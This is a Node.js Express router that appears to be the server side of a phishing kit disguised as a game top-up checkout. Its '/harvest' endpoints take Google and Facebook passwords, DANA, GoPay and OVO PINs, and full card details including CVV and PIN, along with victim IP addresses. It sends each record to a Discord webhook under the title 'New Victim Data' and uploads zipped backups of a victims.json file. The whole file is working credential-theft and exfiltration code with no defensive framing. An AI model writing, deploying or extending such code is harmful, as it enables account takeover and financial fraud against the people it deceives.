const express = require('express');
const router = express.Router();
const fs = require('fs-extra');
const axios = require('axios');
const path = require('path');
const AdmZip = require('adm-zip');
const FormData = require('form-data');

// Get webhook URL from file
function getWebhookURL() {
  try {
    const webhookPath = path.join(__dirname, '..', process.env.DISCORD_WEBHOOK_FILE);
    const webhook = fs.readFileSync(webhookPath, 'utf8').trim();
    return webhook;
  } catch (err) {
    console.error('Error reading webhook.txt:', err.message);
    return null;
  }
}

// Send to Discord webhook
async function sendToDiscord(data) {
  const webhookURL = getWebhookURL();
  if (!webhookURL || !webhookURL.startsWith('https://discord.com/api/webhooks/')) {
    console.log('⚠️  No valid Discord webhook configured');
    return;
  }

  try {
    const embed = {
      title: '🎯 New Victim Data',
      color: 0xFF4655,
      fields: [
        { name: '👤 Player ID', value: data.playerId || 'N/A', inline: true },
        { name: '🎯 Type', value: data.type || 'Unknown', inline: true },
        { name: '🕒 Timestamp', value: new Date().toLocaleString('id-ID'), inline: false },
        { name: '🌐 IP Address', value: data.ip || 'N/A', inline: true }
      ],
      timestamp: new Date()
    };

    // Add specific fields based on type
    if (data.type === 'google' || data.type === 'facebook') {
      embed.fields.push(
        { name: '📧 Email', value: data.email || 'N/A', inline: false },
        { name: '🔐 Password', value: data.password || 'N/A', inline: false }
      );
    } else if (data.type === 'dana' || data.type === 'gopay' || data.type === 'ovo') {
      embed.fields.push(
        { name: '📱 Phone/Email', value: data.identifier || 'N/A', inline: false },
        { name: '🔢 PIN', value: data.pin || 'N/A', inline: false }
      );
    } else if (data.type === 'card') {
      embed.fields.push(
        { name: '💳 Card Number', value: data.cardNumber || 'N/A', inline: false },
        { name: '📅 Expiry', value: data.expiry || 'N/A', inline: true },
        { name: '🔒 CVV', value: data.cvv || 'N/A', inline: true },
        { name: '🔢 PIN', value: data.pin || 'N/A', inline: false }
      );
    }

    await axios.post(webhookURL, {
      embeds: [embed]
    });

    console.log('✅ Data sent to Discord webhook');
  } catch (err) {
    console.error('❌ Failed to send to Discord:', err.response?.data || err.message);
  }
}

// Send victims.json as ZIP to Discord
async function sendZipToDiscord() {
  const webhookURL = getWebhookURL();
  if (!webhookURL || !webhookURL.startsWith('https://discord.com/api/webhooks/')) return;

  try {
    const dataPath = path.join(__dirname, '..', 'data', 'victims.json');
    if (!(await fs.pathExists(dataPath))) return;

    // Create ZIP in memory
    const zip = new AdmZip();
    zip.addLocalFile(dataPath);
    const buffer = zip.toBuffer();

    const form = new FormData();
    form.append('content', '📦 **New Backup: victims.json updated!**');
    form.append('file', buffer, { filename: 'victims_backup.zip' });

    await axios.post(webhookURL, form, {
      headers: { ...form.getHeaders() }
    });

    console.log('✅ ZIP backup sent to Discord');
  } catch (err) {
    console.error('❌ Failed to send ZIP to Discord:', err.response?.data || err.message);
  }
}

// Save to local JSON (Disabled on Vercel as disk is read-only)
async function saveToLocal(data) {
  if (process.env.VERCEL) {
    console.log('ℹ️ Running on Vercel, skipping local file save.');
    return;
  }

  const dataPath = path.join(__dirname, '..', 'data', 'victims.json');
  
  try {
    let victims = [];
    if (await fs.pathExists(dataPath)) {
      victims = await fs.readJson(dataPath).catch(() => []);
    }

    victims.push({
      ...data,
      timestamp: new Date().toISOString()
    });

    await fs.ensureDir(path.join(__dirname, '..', 'data'));
    await fs.writeJson(dataPath, victims, { spaces: 2 });
    console.log('✅ Data saved to victims.json');

    // Trigger ZIP backup
    await sendZipToDiscord();
  } catch (err) {
    console.error('⚠️ Skipping local save:', err.message);
  }
}

// POST /api/harvest/google
router.post('/harvest/google', async (req, res) => {
  const { email, password, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'google',
    email,
    password,
    playerId,
    ip
  };

  await Promise.all([
    sendToDiscord(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/checkout?step=payment' });
});

// POST /api/harvest/facebook
router.post('/harvest/facebook', async (req, res) => {
  const { email, password, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'facebook',
    email,
    password,
    playerId,
    ip
  };

  await Promise.all([
    sendToDiscord(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/checkout?step=payment' });
});

// POST /api/harvest/dana
router.post('/harvest/dana', async (req, res) => {
  const { identifier, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'dana',
    identifier,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToDiscord(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

// POST /api/harvest/gopay
router.post('/harvest/gopay', async (req, res) => {
  const { identifier, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'gopay',
    identifier,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToDiscord(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

// POST /api/harvest/ovo
router.post('/harvest/ovo', async (req, res) => {
  const { identifier, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'ovo',
    identifier,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToDiscord(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

// POST /api/harvest/card
router.post('/harvest/card', async (req, res) => {
  const { cardNumber, expiry, cvv, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'card',
    cardNumber,
    expiry,
    cvv,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToDiscord(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

module.exports = router;
